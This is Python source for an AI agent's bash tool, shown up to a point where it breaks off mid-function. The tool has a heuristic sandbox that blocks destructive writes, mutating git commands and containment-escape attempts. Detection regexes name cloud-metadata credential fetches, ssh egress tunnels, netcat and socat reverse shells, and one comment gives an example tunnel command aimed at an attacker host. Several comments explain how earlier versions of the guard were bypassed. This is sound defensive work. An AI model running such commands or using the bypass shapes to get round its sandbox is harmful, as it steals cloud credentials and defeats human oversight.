"""Bash tool — execute shell commands and return stdout/stderr."""

from __future__ import annotations

import asyncio
import locale
import logging
import os
import re
import shlex
import signal
import tempfile

from emrg._win import win32_no_window_kwargs
from emrg.server.git_utils import no_prompt_env
from emrg.server.tool_types import ToolDefinition, ToolResult
from emrg.tools.base import ToolExecutor

logger = logging.getLogger(__name__)


MAX_OUTPUT_CHARS = 200_000  # Truncate large outputs (framing supports up to 16MB)

# Heredoc start: `cmd <<'EOF'` / `cmd <<EOF` / `cmd <<-EOF` (quote optional,
# matched symmetrically via backreference). MULTILINE so ^/$ bound the first
# command line, not the whole command string. cmd.exe cannot parse this.
_HEREDOC_START_RE = re.compile(
    r"^(?P<head>.*?)(?P<op><<-?)(?P<quote>['\"]?)(?P<name>[A-Za-z_][A-Za-z0-9_.-]*)(?P=quote)\s*$",
    re.MULTILINE,
)


def _translate_windows_heredocs(cmd: str) -> tuple[str, str | None]:
    """Translate the first bash heredoc into a stdin redirect for cmd.exe.

    The bash tool's subprocess shell on Windows is cmd.exe (via COMSPEC),
    which cannot parse ``cmd <<'EOF' ... EOF`` heredocs — commands documented
    with heredoc syntax (e.g. ``browser-harness <<'PY' ... PY``) fail with
    ``<< is not recognized`` / ``此时不应有 <<``, forcing agents into temp-file
    workarounds. Rewriting the heredoc to ``cmd < tempfile`` feeds the same
    bytes via stdin redirect, so Windows agents run the identical commands as
    POSIX (host sessions 2026-08-14T21:26/21:36 observed the failure twice).

    Only the FIRST heredoc is translated (multiple heredocs in one command are
    rare); an unterminated heredoc is left untouched so cmd.exe reports the
    original error. ``<<-`` (tab-stripping) strips leading tabs from the body,
    mirroring bash. Content is written literally (quoted ``<<'EOF'``
    semantics; unquoted heredocs containing ``$`` expansion keep literal
    content — a documented approximation). Everything before the opener line
    (e.g. ``cd /tmp\n`` in a multi-line command) is preserved verbatim in the
    rewritten command, so the heredoc feeds the same stdin into the same
    command line as POSIX (review #797 ❌).

    Returns ``(rewritten_cmd, temp_path)`` — the caller must unlink temp_path
    after the subprocess finishes (normal or timeout path).
    """
    m = _HEREDOC_START_RE.search(cmd)
    if not m:
        return cmd, None
    head, op, name = m.group("head"), m.group("op"), m.group("name")
    strip_tabs = op.endswith("-")
    # Terminator: a line containing exactly the delimiter (optionally indented
    # with tabs when the opener used `<<-`, mirroring bash tab-stripping).
    term = re.compile(rf"(?m)^[ \t]*{re.escape(name)}\s*$" if strip_tabs
                      else rf"(?m)^{re.escape(name)}\s*$")
    tm = term.search(cmd, m.end())
    if not tm:
        return cmd, None  # unterminated — let cmd.exe report it
    body = cmd[m.end():tm.start()]
    if body.startswith("\r\n"):
        body = body[2:]  # opener-line newline is not part of the body
    elif body.startswith("\n"):
        body = body[1:]
    if strip_tabs:
        body = "\n".join(line.lstrip("\t") for line in body.split("\n"))
    # bash keeps the newline that precedes the terminator line as part of the
    # body (a heredoc always ends with exactly one newline) — keep it verbatim.
    tail = cmd[tm.end():].strip()
    fd, path = tempfile.mkstemp(suffix=".heredoc", text=True)
    try:
        # newline="" keeps LF verbatim (no CRLF conversion of the body)
        with os.fdopen(fd, "w", encoding="utf-8", newline="") as f:
            f.write(body)
    except Exception:
        try:
            os.unlink(path)
        except OSError:
            pass
        raise
    # Keep everything before the opener line (multi-line commands such as
    # `cd /tmp\npython <<'PY'` must not lose their prefix — review #797 ❌).
    rewritten = f"{cmd[:m.start()]}{head}< \"{path}\""
    if tail:
        rewritten += f" {tail}"
    return rewritten.rstrip(), path


# ── Sandbox — file-level isolation for the bash tool (rant 2026-08-20T15:46:50) ──
#
# Three tiers (default danger-full-access = current, un-sandboxed behavior):
#   danger-full-access  — no checks at all (existing behavior)
#   read-only           — no writes allowed: destructive commands (rm -r /
#                         rmdir / mv / cp -r), git mutating commands (stash /
#                         checkout / restore / clean / reset / commit / push /
#                         pull / merge / rebase — community issue #979) and
#                         shell redirects (> / >>) to any non-/dev/null target
#                         are blocked
#   workspace-write     — writes inside the workspace root (and the OS temp
#                         area) are allowed; destructive writes to protected
#                         daemon state files and to absolute paths outside
#                         the workspace are blocked
#   both checked tiers  — destination-based containment-escape guard
#                         (issue #1102, borrowed from Claude Code v2.1.257):
#                         cloud metadata-credential fetches (IMDS/ECS/GCP)
#                         and egress-tunnel markers (ssh -R/-D, nc -e,
#                         socat EXEC:/SYSTEM:, IMDSv2 token) are blocked;
#                         the danger tier only warns (command still runs)
#
# Enforcement is deliberately heuristic (host design-finalized): a static
# command scan, NOT an OS-level sandbox (no bwrap/Seatbelt/ACL). The checked
# modes report enforcement="partial" — honest reporting, never pretending
# full OS-level isolation. The core value is blocking a hallucinated LLM's
# obviously destructive commands (rm -rf with a wrong path, writing the
# daemon's own state files).

SANDBOX_MODES = ("danger-full-access", "read-only", "workspace-write")

# Daemon state files — writing to these from a sandboxed task is always
# blocked (they are the daemon's own data, not agent scratch space).
_PROTECTED_FILES = (
    "~/.emrg/config.toml",
    "~/.emrg/emrgd.token",
    "~/.emrg/tasks.yml",
    "~/.emrg/projects.yml",
    "~/.emrg/rants.jsonl",
)

# Shell operators that separate one command from the next in a chain. After
# tokenizing with punctuation_chars these arrive as their own tokens, which is
# what lets `_args_after_command` stop at the next command.
_COMMAND_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})

# Verbs whose *arguments are files they rewrite in place*. They were invisible
# to the old spelling-based scan (issue #1162): `sed -i`, `truncate`, `tee`.
# A read-only cycle exists to protect uncommitted work, and every one of these
# can destroy it just as completely as `rm -rf`.
_INPLACE_WRITER_VERBS = frozenset({"truncate", "tee", "shred"})

# Options that take their value as the *next* token. Filtering arguments by
# `not startswith("-")` alone cannot tell an option's value from an operand:
# `truncate -s 0 a.txt` yields `0` (the size) as the first non-flag token, so
# the block would name the size instead of the file. Only the options that
# actually appear in the verbs covered below are listed — this stays a
# decision aid, not a full getopt implementation.
_OPTIONS_WITH_VALUE = frozenset({
    "-s", "--size",          # truncate
    "-o", "--output",        # tee
    "-n", "-N", "-s", "--size",  # shred
    "-e", "--expression",    # sed
})

# Git mutating commands — blocked under read-only (community issue #979,
# heinrichneb dev.to comment on the 2026-08-20 data-loss postmortem): the
# incident's actual killers (`git stash`, `git checkout .`, `git reset --hard`,
# `git clean`) were NOT caught by the rm/rmdir/mv/cp checks. Under read-only
# these must be structurally impossible, not merely discouraged by a prompt
# rule — "rules can regress; topology can't". Read-only git reads (status /
# fetch / log / diff / remote) stay allowed.
#
# ⚠️ These are matched against the **parsed** command (the resolved verb), not
# against raw command text (issues #1156 + #1159). Both filed defects had the
# same root cause: a regex over the raw string is a statement about *spelling*,
# while the guard's purpose is a statement about *effect*.
#
#   - Under-block (#1156): a git global option sits exactly where the old
#     pattern expected the subcommand, so `git -C . checkout .`,
#     `git -c x=1 stash` and `git --work-tree=. reset --hard` were all allowed
#     (7/7 mutators × 4/4 spellings).
#   - Under-block (#1159): a verb never on the list — `git read-tree -u --reset
#     HEAD` destroys uncommitted work and was allowed. `--reset` is a substring
#     but not the verb, so it did not match.
#   - Over-block: the same raw-text scan refused commands that merely *mention*
#     a mutator (a string literal inside a heredoc), and `git merge-base` was
#     refused as though it were `git merge`.
#
# Parsing fixes all three at once and is the reason this is a verb set rather
# than more regex: the unit of protection becomes the resolved verb.
#
# ⚠️ The set is a **read allowlist** and the default is BLOCK
# (`_git_invocation_is_mutator` returns the verb for anything not listed). The
# earlier design was the opposite — a blocklist of mutating verbs — and that is
# a category that cannot be completed: `git help -a` lists 169 subcommands and
# upstream adds more, so "not on the list" is a permanent, growing set of
# *allowed* commands. Measured on the blocklist: 129 of 169 subcommands stayed
# allowed, and `git checkout-index -f -a` — which overwrites uncommitted work
# exactly like `git checkout` — was blocked only by accident, because the old
# raw-text regex matched `checkout` as a *substring* of `checkout-index`.
# Parsing the verb correctly removed that accident and exposed the hole.
# Fail-closed deletes the category: a verb is allowed only when it is listed
# here as one that prints information and writes nothing. Unknown and future
# subcommands block by default, which is the safe direction for a guard whose
# failure mode is silent, irreversible data loss.
_GIT_READ_VERBS = frozenset({
    # porcelain interrogators — print information, write nothing
    "status", "log", "show", "diff", "diff-files", "diff-index", "diff-tree",
    "diff-pairs", "shortlog", "whatchanged", "describe", "blame", "annotate",
    "name-rev", "rev-list", "rev-parse", "range-diff", "grep", "ls-files",
    "ls-tree", "ls-remote", "cat-file", "merge-base", "merge-tree",
    "for-each-ref", "for-each-repo", "show-branch", "show-index", "show-ref",
    "count-objects", "verify-commit", "verify-pack", "verify-tag", "patch-id",
    "get-tar-commit-id", "fsck", "diagnose", "refs", "revisions", "var",
    "version", "help", "repository-layout",
    # pure stdin/stdout text filters — read a stream, print a stream
    "check-attr", "check-ignore", "check-mailmap", "check-ref-format",
    "fmt-merge-msg", "interpret-trailers", "mailinfo", "mailsplit", "mailmap",
    "stripspace", "column",
    # Remote-tracking / credential inspection: these write only under .git or
    # in the user's credential store, never the working tree — and issue #979 is
    # a dirty-tree guard. `fetch` is deliberately kept: the previous design
    # allowed it, it cannot destroy uncommitted work, and refusing it would be a
    # usability regression with no safety gain.
    "fetch", "credential",
})
# Verbs whose *shape* decides — the verb alone says nothing about the effect.
# Kept out of `_GIT_READ_VERBS` so each is judged by explicit logic, and each
# defaults to BLOCK when its shape is not a proven read.
_GIT_SHAPE_DECIDED = frozenset({"stash", "worktree", "submodule", "remote",
                                "branch", "tag", "config", "hash-object"})
# Listing flags for `branch` / `tag`: with one of these the command prints and
# writes nothing, even when a pattern argument follows (`git tag -l 'v*'`).
_GIT_LIST_FLAGS = frozenset({"-l", "--list", "-a", "--all", "-r", "--remotes",
                             "-v", "-vv", "--verbose", "--contains", "--merged",
                             "--no-merged", "--points-at", "--format",
                             "--show-current", "--column", "--sort", "--color",
                             "--no-color", "--ignore-case"})
# `git branch -a` / `git tag -l` / `git tag` are reads; a delete or force flag
# makes them destructive (`git branch -D old`, `git tag -d v1`).
_GIT_WRITE_FLAGS = frozenset({"-d", "-D", "--delete", "-f", "--force", "-m",
                              "-M", "--move", "--set-upstream-to", "-u"})
# `git config` reads unless it writes: read flags, or no positional key.
_GIT_CONFIG_READ_FLAGS = frozenset({"--get", "--get-all", "--get-regexp",
                                    "-l", "--list", "--get-urlmatch"})
# git global options that take a SEPARATE argument — the parser must skip both
# the option and its value to find the verb (`git -C . checkout .`).
_GIT_GLOBAL_WITH_VALUE = frozenset({"-C", "-c", "--exec-path", "--git-dir",
                                    "--work-tree", "--namespace", "--super-prefix"})
# Shell operators that separate one command from the next in a chain.
_SHELL_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})
# Tokens that put what follows them in command position without being commands
# themselves: grouping (`( … )`, `{ … }`) and shell negation (`! cmd`).
_COMMAND_POSITION_OPERATORS = frozenset({"(", "{", "!", "`"})
# Prefix commands that *run* their argument as a command. `env git checkout .`
# and `sudo git checkout .` genuinely invoke git, so a `git` token after one of
# these is an invocation even though it is not first in the stream. This is the
# case that stops the over-block fix from becoming an under-block.
_COMMAND_WRAPPERS = frozenset({
    "env", "sudo", "doas", "xargs", "nohup", "time", "timeout", "nice",
    "setsid", "stdbuf", "command", "exec", "ionice", "chrt", "watch",
})
# `FOO=1 git checkout .` — the shell strips leading assignments and runs the
# rest, so an assignment is a prefix, not a command.
_ENV_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
# Shells whose `-c <string>` argument is itself a command the shell will run.
# The guard must read *that* text, not stop at the outer token stream: before
# this, `sh -c 'git checkout .'` reached the mutator only because a raw-text
# regex happened to scan the whole line. Parsing the outer tokens alone sees
# `sh`, `-c`, and one opaque string — so a wrapper no longer blocks unless the
# nested text is parsed too. This is a return to the old behaviour by a
# different route: the old scan was right about these 5 shapes and wrong about
# the 7 it missed; parsing must not trade one half for the other.
_SHELL_WRAPPERS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "ash"})
# Commands whose entire argument list is a command the shell will re-parse and
# run (`eval 'git checkout .'`). `xargs`/`env`/`nohup`/`time`/`command` prefix
# a real invocation and are already handled, because the invocation is still in
# the token stream.
_SHELL_EVALUATORS = frozenset({"eval"})

# ── Containment-escape guard (issue #1102) ─────────────────────────────────
# Borrowed from Claude Code v2.1.257 ("Containment Escape"): block cloud
# metadata-credential fetches and egress-tunnel markers. The write-target
# scan cannot catch these — a metadata fetch is a READ and touches no
# protected file path, so the destination-based scan below is required.

# Cloud metadata endpoints — never legitimate in development commands.
# IMDSv1/v2 (AWS), ECS container creds (AWS), GCP metadata (IP + DNS),
# IMDSv2 IPv6 (AWS).
_METADATA_ENDPOINT_RE = re.compile(
    r"169\.254\.169\.254|169\.254\.170\.2|169\.254\.169\.123|"
    r"metadata\.google\.internal|fd00:ec2::254"
)
# ssh remote/dynamic forward (-R / -D) — the classic egress tunnels
# (`ssh -R 1080:169.254.169.254:80 user@attacker`). Requires a standalone
# `ssh` token (never ssh-add/ssh-agent/ssh-keygen/...), stops at quotes so
# `ssh host 'grep -R x'` (a remote command, not a tunnel) is not flagged, and
# does NOT block `-L` (the common dev port-forward; a `-L` whose destination
# is a metadata endpoint is already caught by the endpoint rule above).
_SSH_TUNNEL_RE = re.compile(
    r"(?<!\S)ssh(?:\.exe)?\s+(?:[^|;&\n'\"]*?\s)?-[a-zA-Z]*[RD][a-zA-Z]*"
)
# ssh long-form forwards (`-o RemoteForward=...` / `-o DynamicForward=...`).
# These are often quoted (`-o 'RemoteForward=1080:localhost:80'`), so this
# rule deliberately does NOT stop at quotes — the RemoteForward=/DynamicForward=
# string has no legitimate non-tunnel use (unlike `-R`, which collides with
# `grep -R` inside remote commands).
_SSH_FORWARD_LONG_RE = re.compile(
    r"(?<!\S)ssh(?![\w-])[^|;&\n]*?\b(?:Remote|Dynamic)Forward\s*="
)
# netcat / ncat with -e/--exec — a reverse/backdoor shell, never legitimate.
_NC_EXEC_RE = re.compile(
    r"\bnc(?:at)?\b[^|;&\n'\"]*?(?:-[a-zA-Z]*e[a-zA-Z]*\b|--exec\b)"
)
# socat with EXEC:/SYSTEM: — a backdoor address, never legitimate.
_SOCAT_EXEC_RE = re.compile(r"\bsocat\b[^|;&\n'\"]*\b(?:EXEC|SYSTEM):")
# IMDSv2 token request header — belt-and-suspenders for URL-obfuscated fetches.
_IMDSV2_TOKEN_RE = re.compile(r"X-aws-ec2-metadata-token")


def _check_containment_escape(cmd: str) -> str | None:
    """Destination-based containment-escape scan (issue #1102, borrowed from
    Claude Code v2.1.257 "Containment Escape").

    Returns a block reason naming the exact escape vector when the command
    fetches cloud metadata credentials or opens an egress tunnel; returns
    None when the command looks clean.

    Complements the write-target scan: ``curl http://169.254.169.254/...``
    touches no protected file path, so ``workspace-write`` target checks pass
    it — the credential exfiltration happens over the network. Runs on both
    checked tiers (read-only blocks writes, but a metadata fetch is a read,
    so the destination check is required there too).
    """
    for label, pattern in (
        ("cloud-metadata endpoint", _METADATA_ENDPOINT_RE),
        ("ssh egress tunnel (-R/-D)", _SSH_TUNNEL_RE),
        ("ssh egress tunnel (Remote/DynamicForward)", _SSH_FORWARD_LONG_RE),
        ("netcat exec backdoor", _NC_EXEC_RE),
        ("socat EXEC/SYSTEM backdoor", _SOCAT_EXEC_RE),
        ("IMDSv2 token request", _IMDSV2_TOKEN_RE),
    ):
        m = pattern.search(cmd)
        if m:
            return (
                f"containment-escape: blocked {label} {m.group(0)!r} "
                "(cloud credential exfiltration guard, issue #1102)"
            )
    return None


def _split_command_tokens(cmd: str) -> list[str]:
    """Split a shell command into tokens, preserving operators like ``&&``.

    ``shlex`` in POSIX mode with ``punctuation_chars`` keeps quoting semantics:
    a ``>`` inside a quoted argument stays *inside* the token instead of
    becoming an operator (issue #1162), and ``&&`` / ``;`` / ``|`` survive as
    tokens so a chain can be walked.

    Falls back to a whitespace split when the input is unparseable (an
    unterminated quote), because a guard that raises on odd input is worse
    than one that over-blocks it.
    """
    try:
        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        return list(lex)
    except ValueError:
        return cmd.split()


def _command_word(tok: str) -> str:
    """A command word without its directory prefix or Windows extension.

    ``/usr/bin/rm`` and ``rm.exe`` name the same program as ``rm``; matching
    only the bare spelling guards the polite form of the command.
    """
    base = tok.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    if base.lower().endswith(".exe"):
        base = base[:-4]
    return base


def _args_after_command(tokens: list[str], i: int) -> list[str]:
    """The argument tokens of the command starting at ``tokens[i]``.

    Stops at the next command in a chain, so ``rm -rf a; echo hi`` yields only
    ``a`` — the shell separators are their own tokens after tokenizing.
    """
    args: list[str] = []
    for tok in tokens[i + 1:]:
        if tok in _COMMAND_SEPARATORS or tok in ("<", ">", ">>", "&>", "&>>"):
            break
        args.append(tok)
    return args


def _positional_args(tokens: list[str], i: int) -> list[str]:
    """The non-option *operands* of the command starting at ``tokens[i]``.

    Unlike a plain "drop anything starting with ``-``" filter, this also drops
    the value that follows an option which takes one. Without that,
    ``truncate -s 0 a.txt`` reports the size ``0`` as the file to be written,
    and the block names the wrong thing — a guard whose message points at a
    token that is not a path is a guard nobody can trust. A lone ``--`` ends
    option parsing, so everything after it is an operand.
    """
    out: list[str] = []
    args = _args_after_command(tokens, i)
    skip_next = False
    for tok in args:
        if skip_next:
            skip_next = False
            continue
        if tok == "--":
            continue
        if tok.startswith("-") and tok != "-":
            # `-s0` / `--size=0` carry their value in the same token; only the
            # spaced form consumes the next one.
            if tok in _OPTIONS_WITH_VALUE:
                skip_next = True
            continue
        out.append(tok)
    return out


def _extract_write_targets(cmd: str) -> list[str]:
    """Write targets of ``cmd``: the paths a command appears to write.

    Returns path tokens the command appears to write to:
      - ``rm <path>...`` and ``rmdir <path>`` → the removed paths
      - ``mv <src> <dst>`` / ``cp <src> <dst>`` → the destination
      - ``> / >> / 2> / &>`` redirects → the redirect target

    **Parsed, not scanned** (issue #1162). The previous version regex-scanned
    raw text, which failed in both directions:

      - it read a ``>`` *inside a quoted argument* as a redirect, so ordinary
        reads were refused — ``echo "a > b"`` reported target ``'b"'``,
        ``python3 -c "print(1 > 0)"`` reported ``'0)"'``, and any ``->`` in
        prose was a redirect to the next word. Measured on master: 7 of 7
        ordinary read commands blocked, including a ``gh issue create`` whose
        *title* contained ``>`` (which cost the host a retry in a real cycle);
      - it matched verbs by spelling, so ``rm <file>`` (no recursive flag) and
        unlisted writers (``sed -i``, ``truncate``, ``tee``, ``cp`` without
        ``-r``) were not destructive at all — 7 of 7 measured writes allowed.

    Quoting is what distinguishes the two: the token stream already knows
    whether ``>`` was an operator or a character in an argument, so both
    directions are fixed by the same change.

    Still deliberately non-exhaustive in *which verbs* it covers (an
    interpreter can always write a file); the honest boundary stays
    ``enforcement="partial"``.
    """
    tokens = _split_command_tokens(cmd)
    targets: list[str] = []
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        word = _command_word(tok)
        # Redirects: `>` `>>` `&>` `&>>` are their own tokens, and a numeric
        # fd prefix arrives as a separate token (`2` `>` `e`).
        if tok in (">", ">>", "&>", "&>>") or re.fullmatch(r"\d*>>?", tok):
            if i + 1 < len(tokens) and tokens[i + 1] not in _COMMAND_SEPARATORS:
                targets.append(tokens[i + 1])
                i += 2
                continue
        elif word == "rm" or word == "rmdir":
            # Any operand is removed — NOT only with a recursive flag.
            # `rm a.txt` destroys uncommitted work exactly like `rm -rf dir`;
            # whether the delete recurses does not decide whether the file
            # survives.
            targets.extend(_positional_args(tokens, i))
        elif word == "mv":
            args = _positional_args(tokens, i)
            if len(args) >= 2:
                targets.append(args[-1])
        elif word == "cp":
            args = _positional_args(tokens, i)
            if len(args) >= 2:
                targets.append(args[-1])
        elif word in _INPLACE_WRITER_VERBS:
            targets.extend(_positional_args(tokens, i))
        elif word == "sed":
            # `sed -i` rewrites its file operands in place; a bare `sed` is a
            # filter that writes only to stdout and must stay allowed. The flag
            # may carry a suffix (`-i.bak`), so test the prefix.
            args = _args_after_command(tokens, i)
            if any(t == "-i" or t.startswith("-i") for t in args):
                # The first operand of `sed` is the *script*, not a file —
                # only the operands after it are rewritten. Naming the script
                # (`sed -i s/a/b/ f.txt` → `s/a/b/`) would point the block at
                # something that is not a path.
                targets.extend(_positional_args(tokens, i)[1:])
        elif word == "find":
            # `find <paths> ... -delete` removes every match; the paths it was
            # pointed at are the work at risk. Without `-delete` a `find` is a
            # read and must stay allowed (issue #1162 listed `-delete` as an
            # allowed destructive write on master).
            args = _args_after_command(tokens, i)
            if "-delete" in args:
                targets.extend(_positional_args(tokens, i))
        i += 1
    return targets


def _protected_paths() -> list[str]:
    """Canonicalized (realpath) protected daemon state files."""
    out: list[str] = []
    for p in _PROTECTED_FILES:
        try:
            out.append(os.path.realpath(os.path.expanduser(p)))
        except OSError:
            pass
    return out


def _trusted_write_zones() -> list[str]:
    """Canonicalized write roots that a ``workspace-write`` session may target.

    These are trusted alongside the injected workspace root and the OS temp
    area — targets inside them are never blocked by the ``workspace-write``
    boundary:

    - ``~/.emrg/evolution/.emrg/`` — the evolution module's own data root
      (cycle records under ``memory/``, ``sessions/`` scratch). The evolution
      task runs at ``workspace-write`` with ``workspace`` = the repo checkout
      (``~/.emrg/evolution/emrg``), so its own record writes to
      ``~/.emrg/evolution/.emrg/memory/*.md`` fall OUTSIDE ``workspace`` and
      would be blocked — a self-regression from PR #1092 (issue #1093). Trust
      this root like the daemon's own ``~/.emrg`` state, so the evolution
      module can still record its history.
    """
    out: list[str] = []
    evo_data = os.path.expanduser("~/.emrg/evolution/.emrg")
    try:
        out.append(os.path.realpath(evo_data))
    except OSError:
        pass
    return out


def _temp_write_roots() -> set[str]:
    r"""Canonicalized OS-temp write roots, normalized for the ``Temp\<suffix>``
    discrepancy (issue #1093 proposal #3).

    ``tempfile.gettempdir()`` may return ``C:\\...\\AppData\\Local\\Temp\\2``
    (8.3 short name + ``\\2`` suffix) on Windows, while helpers/scripts are
    written to the plain ``...\\Temp\\`` root. When ``gettempdir()`` points at
    a ``Temp``-named parent with a suffix child, also trust the parent ``Temp``
    root so both spellings are allowed.
    """
    roots: set[str] = set()
    t = tempfile.gettempdir()
    try:
        roots.add(os.path.realpath(t))
    except OSError:
        pass
    parent = os.path.dirname(t)
    if os.path.basename(parent).lower() == "temp":
        try:
            roots.add(os.path.realpath(parent))
        except OSError:
            pass
    return roots


def _is_absolute_path(p: str) -> bool:
    """True when ``p`` is absolute (or drive-less rooted, e.g. ``/etc/hosts``
    on Windows — ntpath.isabs returns False for those, but they still do not
    resolve under the cwd, so the sandbox must treat them as absolute)."""
    return os.path.isabs(p) or p.startswith("/") or p.startswith("\\")


def _is_within(path: str, root: str) -> bool:
    """True when ``path`` (absolute) is inside ``root`` (absolute) or equals it."""
    try:
        rp = os.path.realpath(path)
        rr = os.path.realpath(root)
        return rp == rr or rp.startswith(rr + os.sep)
    except OSError:
        return False


def check_read_only_file_write(file_path: str, workspace: str | None = None) -> str | None:
    """Read-only sandbox check for the write/edit tools (community issue #979).

    Returns a block reason when the target file is inside the task's workspace
    (the host's working tree — protected by the structural dirty-tree guard) or
    is a protected daemon state file; returns None when allowed.

    Writes OUTSIDE the workspace (memory dir, logs, OS temp) stay allowed so a
    read-only cycle can still record state and write its own artifacts — the
    guard protects the host's uncommitted work, not the agent's own scratch
    space. Mirrors the bash tool's read-only semantics for file tools.
    """
    path = os.path.realpath(os.path.expanduser(file_path))
    if workspace:
        ws = os.path.realpath(os.path.expanduser(workspace))
        if _is_within(path, ws):
            return (
                f"read-only sandbox: blocked file write inside workspace {path!r} "
                "(dirty-tree guard, community issue #979)"
            )
    if path in _protected_paths():
        return (
            f"read-only sandbox: blocked write to protected daemon file {path!r}"
        )
    return None


def check_workspace_write(file_path: str, workspace: str | None = None) -> str | None:
    """workspace-write sandbox check for the write/edit tools (rant 2026-09-01T15:10:23).

    Returns a block reason when the target file is a protected daemon state file,
    is ``~/.emrg`` itself, or is an absolute path outside the workspace root
    (OS temp allowed — mirrors dsh's workspace + backend-promised temp area);
    returns None when allowed.

    Relative paths are assumed in-workspace (cwd = the workspace root), matching
    the bash tool's workspace-write semantics (2026-08-20T15:46:50) and dsh's
    writableRoots single-source + tool-symmetry design. Without this check the
    write/edit tools let ``workspace-write`` sessions write anywhere outside the
    session cwd, while the bash tool is correctly blocked — the asymmetric hole
    this function closes.
    """
    if not file_path:
        return None
    expanded = os.path.expanduser(file_path)
    if not _is_absolute_path(expanded):
        # Relative target: assumed in-workspace (cwd = the workspace root).
        return None
    real = os.path.realpath(expanded)
    if real in _protected_paths():
        return (
            f"workspace-write sandbox: blocked write to protected daemon file {file_path!r}"
        )
    emrg_home = os.path.realpath(os.path.expanduser("~/.emrg"))
    if real == emrg_home:
        return (
            f"workspace-write sandbox: blocked destructive write to {file_path!r} "
            "(would erase the daemon's data directory)"
        )
    workspace_real = (
        os.path.realpath(os.path.expanduser(workspace)) if workspace else None
    )
    # Allow: inside workspace, inside the OS-temp roots (normalized), or inside
    # a trusted zone (~/.emrg/evolution/.emrg — the evolution module's own data
    # root, issue #1093 self-regression). Everything else is blocked.
    allowed_srcs = [workspace_real] if workspace_real else []
    allowed_srcs += list(_trusted_write_zones())
    allowed_srcs += list(_temp_write_roots())
    if not any(
        src and (_is_within(real, src) or real == src) for src in allowed_srcs
    ):
        return (
            f"workspace-write sandbox: blocked write outside workspace {file_path!r}"
        )
    return None


def _tokenize_command(cmd: str) -> list[str]:
    """Split a shell command into tokens, preserving operators like ``&&``.

    Uses ``shlex`` so quoting is respected: a mutator mentioned inside a string
    literal is one token, not a command word — which is what stops the guard
    from refusing a command that merely *talks about* `git merge` (issue #1156
    facet D). Falls back to a whitespace split when the input is unparseable
    (an unterminated quote), because a guard that crashes on odd input is worse
    than one that over-blocks it.

    ⚠️ The punctuation set is explicit and **includes the backtick**. `shlex`'s
    default punctuation set is `();<>|&` — it omits `` ` ``, so a command
    substitution stayed glued to its words: `` `git checkout .` `` tokenised as
    `` ['`git', 'checkout', '.`'] `` and the program word never matched `git`.
    Measured against master 2026-09-12 (`cyc20260912-190602`): the raw-text guard
    blocked all four backtick shapes and this parsed guard allowed all four —
    an under-block in the destructive direction, introduced by the same
    migration that fixed the over-blocks. `$( … )` was unaffected because its
    `git` is already a separate token, which is what made the hole invisible to
    the substitutions that were covered.
    """
    try:
        lex = shlex.shlex(cmd, posix=True, punctuation_chars="();<>|&`")
        lex.whitespace_split = True
        return list(lex)
    except ValueError:
        return cmd.split()


def _runs_as_a_command(tokens: list[str], i: int) -> bool:
    """Whether ``tokens[i]`` is in *command position* — i.e. the shell will run it.

    This is the difference between an invocation and an argument, and it is the
    whole reason a parser is used here rather than a scan: `grep -rn git .` and
    `git status` both contain the token `git`, but only the second runs it.

    A token is in command position when:
      * it is first in the stream, or
      * the token before it is a **command separator** (`&&`, `||`, `;`, `|`,
        `&`, newline), a grouping/negation operator (`(`, `{`, `!`), or
      * the tokens before it are **command wrappers** and their options/values
        (`env`, `sudo`, `xargs`, `nohup`, `time`, `timeout`, `nice`, `doas`,
        `setsid`, `stdbuf`, `command`, …), or
      * the token before it is a `VAR=value` environment assignment
        (`FOO=1 git checkout .` really does run git).

    ⚠️ The wrapper case must keep working, and it needs the flag's **value**
    skipped, not just the flag. The obvious fix for the over-block — "only
    position 0 can be an invocation" — would under-block every wrapper prefix,
    and `env git checkout .` genuinely destroys uncommitted work; a first attempt
    that skipped only flags left `sudo -u root git checkout .`, `timeout 5 git
    checkout .`, `nice -n 5 git checkout .`, `xargs -I{} git checkout .` and
    `stdbuf -o0 git checkout .` all allowed (5 of 44 mutator shapes, measured).
    So a non-flag token that follows a flag is treated as that flag's value and
    skipped.

    That value-test is an **over-approximation**, deliberately: whether a flag
    takes a value is a per-command fact, and enumerating which flags do is the
    same enumeration trap that made the wrapper's `-c` walk unsound. The cost is
    that `xargs -I{} grep git` — where `grep` is the command and `git` its
    argument — is read as a wrapper invocation and blocked. That is a false block
    in the harmless direction, and it is the trade this guard always makes: a
    refused command is loud, and silent data loss is not.
    """
    j = i - 1
    while j >= 0:
        tok = tokens[j]
        if tok in _SHELL_SEPARATORS or tok in _COMMAND_POSITION_OPERATORS:
            return True
        if _is_env_assignment(tok):
            j -= 1
            continue
        if _basename(tok) in _COMMAND_WRAPPERS:
            # The candidate is this wrapper's command argument.
            return True
        if tok.startswith("-"):
            j -= 1
            continue
        # A non-flag token: it belongs to a prefix (a flag's value, or a
        # wrapper's own argument) when the token before it is a flag or a
        # wrapper. Otherwise it is a command word and the candidate is one of
        # its arguments — data, not an invocation.
        if j - 1 >= 0:
            left = tokens[j - 1]
            if left.startswith("-"):
                j -= 2
                continue
            if _basename(left) in _COMMAND_WRAPPERS:
                return True
        return False
    return True


def _git_verbs(tokens: list[str]) -> list[tuple[str, list[str]]]:
    """Resolve every ``git`` invocation in a token stream to ``(verb, rest)``.

    Walks the token stream, and at each ``git`` token skips git's *global*
    options to find the resolved verb (issue #1156: a global option sits
    exactly where a raw-text regex expects the subcommand). Returns one entry
    per invocation, so a chained command is judged by all of its invocations.

    ⚠️ Only a ``git`` token in **command position** is an invocation
    (`_runs_as_a_command`). Treating every `git` token as one over-blocked any
    command that merely *names* git as an argument — `grep -rn git .` was read
    as the invocation `git .`, and the fail-closed default then refused a plain
    search (measured against master 2026-09-12: 9 of 30 read shapes regressed,
    all in that class). The quoted-mention case was already handled because
    tokenising keeps a string literal whole; the *unquoted argument* is the same
    defect one level down, and position is what distinguishes it.

    ``rest`` is the tokens after the verb, needed to decide flag/subcommand-
    dependent verbs (`git branch -D` writes, `git branch -a` reads).
    """
    out: list[tuple[str, list[str]]] = []
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if _basename(tok) != "git" or not _runs_as_a_command(tokens, i):
            i += 1
            continue
        j = i + 1
